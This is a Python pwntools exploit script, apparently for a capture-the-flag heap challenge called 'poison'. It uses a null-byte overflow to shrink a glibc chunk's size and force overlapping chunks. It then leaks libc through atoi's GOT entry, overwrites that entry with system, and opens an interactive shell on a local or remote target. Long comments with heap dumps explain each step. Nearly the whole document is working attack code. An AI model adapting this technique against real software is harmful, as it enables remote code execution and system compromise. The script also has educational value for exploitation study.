from pwn import *

atoi_got = 0x602058
atoi_off = 0x39ea0
sys_off  = 0x46590

def alloc(size, data):

    r.sendlineafter('>> ', '1')
    r.sendlineafter('Size: ', str(size))

    if size > len(data):
        data += '\n'
    r.sendafter('Data: ', data)

    return

def edit(idx, data):

    r.sendlineafter('>> ', '2')
    r.sendlineafter('Index: ', str(idx))
    r.sendafter('Data: ', data)

    return

def free(idx):

    r.sendlineafter('>> ', '3')
    r.sendlineafter('Index: ', str(idx))

    return

def dump(idx):

	r.sendlineafter('>> ', '4')
	r.sendlineafter('Index: ', str(idx))

	r.recvuntil('Data: ')

	return u64(r.recv(6).ljust(8, '\x00'))

def pwn():

	alloc(0x88, 'A'*0x88)	# chunk 0
	alloc(0x108, 'B'*0x108) # chunk 1

	free(0)

	# Could've leaked libc but let's step it up
	alloc(0x8, 'C'*0x8) 

	########################################################
	#
	#	0x603020:	0x0000000000000000	0x0000000000000021
	#	0x603030:	0x4343434343434343	0x00007ffff7dd3838 <-- main_arena + 216
	#
	########################################################

	# p64(0x200) is needed afterwards in order to bypass
	# one unlink's macro check
	alloc(0x208, 'D'*0x1f0 + p64(0x200)) 
	alloc(0x108, 'E'*0x108) 
	# Prevent top chunk consolidation
	alloc(0x108, 'F'*0x108) 

	free(2)

	########################################################
	#
	#	0x6031e0:	0x4242424242424242	0x0000000000000211 <-- chunk x
	#	0x6031f0:	0x00007ffff7dd37b8	0x00007ffff7dd37b8
	#	0x603200:	0x4444444444444444	0x4444444444444444
	#					...
	#	0x6033d0:	0x4444444444444444	0x4444444444444444
	#	0x6033e0:	0x0000000000000200	0x000000000000000a
	#	0x6033f0:	0x0000000000000210	0x0000000000000110 <-- chunk y
	#	0x603400:	0x4545454545454545	0x4545454545454545
	#
	########################################################


	# Null byte poison
	edit(1, 'B'*0x108)

	########################################################
	#
	#	0x6031e0:	0x4242424242424242	0x0000000000000200 <-- chunk x's new size
	#	0x6031f0:	0x00007ffff7dd37b8	0x00007ffff7dd37b8
	#	0x603200:	0x4444444444444444	0x4444444444444444
	#	0x603210:	0x4444444444444444	0x4444444444444444
	#			           ...
	########################################################

	# Further allocations will not update chunk y's prev_size properly. Why?
	# Chunk x is now in the unsorted bin. Once we request an allocation of size <= 0x200
	# malloc will unlink the unsorted chunk and then split it to give it back to the user 
	# while the rest becomes the remainder. Finally the next in use chunk's prev_size field
	# needs to get updated since the free chunk has moved further away (closer).
	#
	#	remainder_size = size - nb; // where nb is the requested size
	#	unlink (av, victim, bck, fwd);
	#	                ...
	#	remainder = chunk_at_offset (victim, nb);
	#	                ...
	#	/* advertise as last remainder */
        #       if (in_smallbin_range (nb))
        #           av->last_remainder = remainder;
	#			...
	#       set_head (victim, nb | PREV_INUSE |
        #               (av != &main_arena ? NON_MAIN_ARENA : 0));
        #       set_head (remainder, remainder_size | PREV_INUSE);
        #       set_foot (remainder, remainder_size);
        #
        # The magic happens at the set_foot() macro. Let's investigate it.
        #
        #	/* Set size at footer (only when chunk is not in use) */
	#	#define set_foot(p, s)	(((mchunkptr) ((char *) (p) + (s)))->mchunk_prev_size = (s))
	#
	# As I said above, the prev_size field of the chunk right after the remainder 
	# chunk needs to get updated since the previous free chunk isn't at offset 
	# (char *)chunk y - 0x200 anymore
	#
	# However, chunk x's size got shrunk, which will lead to chunk y's prev_size not
	# getting updated. Let's do the math and then check it out in action.
	#
	# At the moment 0x200 is the available unsorted bin size. We're about to request
	# 0x108 bytes, which will get aligned to 0x110 bytes because of heap's metadata.
	# So 0x200 - 0x110 = 0xf0 is the remainder size. Meaning, according to malloc's logic, 
	# the prev_size field of chunk y should be set to 0xf0.
	#
	# That is not the case though. Since the requested size is 0x108 (meaning 0x110),
	# the updated free chunk, aka the remainder chunk will be at address 
	# (char *)chunk x + 0x110 = 0x6031e0 + 0x110 = 0x6032f0
	#
	# Finally, set_foot() should set chunk y's prev_size field to 0xf0 since 0x200 - 0x110 = 0xf0.
	# But, 0x6032f0 + 0xf0 = 0x6033e0, which is 0x10 bytes before the address of the prev_size field!
	# So chunk y's prev_size field remains the same thinking the previous free chunk is at address
	# (char *)chunk y - 0x210! Let's check it out in GDB.

	alloc(0x108,  'G'*0x108)

	########################################################
	#
	#	0x6031e0:	0x4242424242424242	0x0000000000000111 <-- new allocated chunk z
	#	0x6031f0:	0x4747474747474747	0x4747474747474747
	#	0x603200:	0x4747474747474747	0x4747474747474747
	#					...
	#	0x6032f0:	0x4747474747474747	0x00000000000000f1 <-- remainder chunk after split
	#	0x603300:	0x00007ffff7dd37b8	0x00007ffff7dd37b8
	#	0x603310:	0x4444444444444444	0x4444444444444444
	#					...
	#	0x6033e0:	0x00000000000000f0	0x000000000000000a
	#	0x6033f0:	0x0000000000000210	0x0000000000000110 <-- chunk y
	#	0x603400:	0x4545454545454545	0x4545454545454545
	#
	########################################################

	# Because there's no pointer in between chunk z and y
	# we need to allocate one more chunk such that once we
	# free chunk y, the next allocation will overlap with the
	# previously allocated chunk.
	alloc(0x80,  'H'*0x80)

	########################################################	
	#
	#	0x6031e0:	0x4242424242424242	0x0000000000000111 <-- new allocated chunk z < - - - - - - - - - +					
	#	0x6031f0:	0x4747474747474747	0x4747474747474747						 |
	#	0x603200:	0x4747474747474747	0x4747474747474747						 |
	#					   ...			                                                 |
	#	0x6032f0:	0x4747474747474747	0x0000000000000021 <-- chunk w                                   |
	#	0x603300:	0x0000000000000080	0x0000000000603320						 | 
	#	0x603310:	0x4444444444444444	0x0000000000000091						 |
	#					   ...				                                         |
	#	0x603390:	0x4848484848484848	0x4848484848484848						 | - 0x210 
	#	0x6033a0:	0x4444444444444444	0x0000000000000041 <-- remainder chunk after next split          |
	#	0x6033b0:	0x00007ffff7dd37b8	0x00007ffff7dd37b8	                                         |
	#	0x6033c0:	0x4444444444444444	0x4444444444444444	                                         |
	#	0x6033d0:	0x4444444444444444	0x4444444444444444	                                         | 
	#	0x6033e0:	0x0000000000000040	0x000000000000000a	                                         |
	#	0x6033f0:	0x0000000000000210	0x0000000000000110 <-- chunk y [still thinks chunk z is free] - -
	#	0x603400:	0x4545454545454545	0x4545454545454545
	#
	########################################################

	free(2)

	########################################################	
	#
	#	0x6031e0:	0x4242424242424242	0x0000000000000111 <-- new allocated chunk z [free] < - - - - -  +					
	#	0x6031f0:	0x00000000006033a0	0x00007ffff7dd37b8						 |
	#	0x603200:	0x4747474747474747	0x4747474747474747						 |
	#					   ...			                                                 |
	#	0x6032f0:	0x0000000000000110	0x0000000000000020 <-- chunk w                                   |
	#	0x603300:	0x0000000000000080	0x0000000000603320						 | 
	#	0x603310:	0x4444444444444444	0x0000000000000091						 |
	#					   ...				                                         |
	#	0x603390:	0x4848484848484848	0x4848484848484848						 | - 0x210 
	#	0x6033a0:	0x4444444444444444	0x0000000000000041 <-- remainder chunk after next split          |
	#	0x6033b0:	0x00007ffff7dd37b8	0x00007ffff7dd37b8	                                         |
	#	0x6033c0:	0x4444444444444444	0x4444444444444444	                                         |
	#	0x6033d0:	0x4444444444444444	0x4444444444444444	                                         | 
	#	0x6033e0:	0x0000000000000040	0x000000000000000a	                                         |
	#	0x6033f0:	0x0000000000000210	0x0000000000000110 <-- chunk y [still thinks chunk z is free] - -
	#	0x603400:	0x4545454545454545	0x4545454545454545
	#
	########################################################

	# unlink
	free(3)

	########################################################
	#
	#	0x6031e0:	0x4242424242424242	0x0000000000000321 <-- consolidated chunk [free]
	#	0x6031f0:	0x00000000006033a0	0x00007ffff7dd37b8
	#					...
	#	0x6032e0:	0x4747474747474747	0x4747474747474747
	#	0x6032f0:	0x0000000000000110	0x0000000000000020 <-- chunk w still in use
	#	0x603300:	0x0000000000000080	0x0000000000603320
	#	0x603310:	0x4444444444444444	0x0000000000000091
	#	0x603320:	0x4848484848484848	0x4848484848484848
	#
	########################################################

	# The new consolidated free chunk is placed in the unsorted bin.
	# Further allocations will split that chunk as long as the request
	# size is <= 0x321.
	alloc(0x140, 'Z'*0x110 + p64(8) + p64(atoi_got))

	########################################################
	#
	#	0x6031e0:	0x4242424242424242	0x0000000000000151 <-- new chunk overlaps with chunk w
	#	0x6031f0:	0x5a5a5a5a5a5a5a5a	0x5a5a5a5a5a5a5a5a
	#				        ...
	#	0x6032f0:	0x5a5a5a5a5a5a5a5a	0x5a5a5a5a5a5a5a5a <-- chunk w overwritten
	#	0x603300:	0x0000000000000008	0x0000000000602058 <-- atoi's GOT entry
	#
	########################################################

	atoi   = dump(5)
	libc   = atoi - atoi_off
	system = libc + sys_off

	log.info("atoi:   0x{:x}".format(atoi))
	log.info("Libc:   0x{:x}".format(libc))
	log.info("system: 0x{:x}".format(system))

	# atoi => system
	edit(5, p64(system))

	# Game over
	r.sendline('sh')

	r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        pwn()
    else:
        r = process('./poison')
        pause()
        pwn()
